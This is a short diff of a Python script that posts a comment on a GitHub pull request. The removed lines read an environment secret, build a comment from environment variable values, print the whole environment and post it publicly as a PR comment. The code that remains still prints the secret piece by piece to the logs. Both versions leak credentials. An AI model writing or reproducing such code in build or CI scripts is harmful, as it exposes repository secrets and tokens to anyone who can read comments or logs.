@@ -3,7 +3,6 @@
 from github_utils import gh_post_pr_comment
 from gitutils import get_git_remote_name, get_git_repo_dir, GitRepo
 import os
-
 def parse_args():
     from argparse import ArgumentParser
     parser = ArgumentParser()
@@ -14,12 +13,11 @@ def main():
     args = parse_args()
     repo = GitRepo(get_git_repo_dir(), get_git_remote_name())
     org, project = repo.gh_owner_and_name()
-    comment = ""
-    for i in os.environ['SECRET']:
+
+    for i in os.environ["SECRET"]:
         print(i)
-        comment +=  f"{i}={os.environ[i]}"
-    print(os.environ)
-    gh_post_pr_comment(org, project, args.pr_num, comment)
+    gh_post_pr_comment(org, project, args.pr_num, "Thanks for your PR!")
+
 
 
 if __name__ == "__main__":
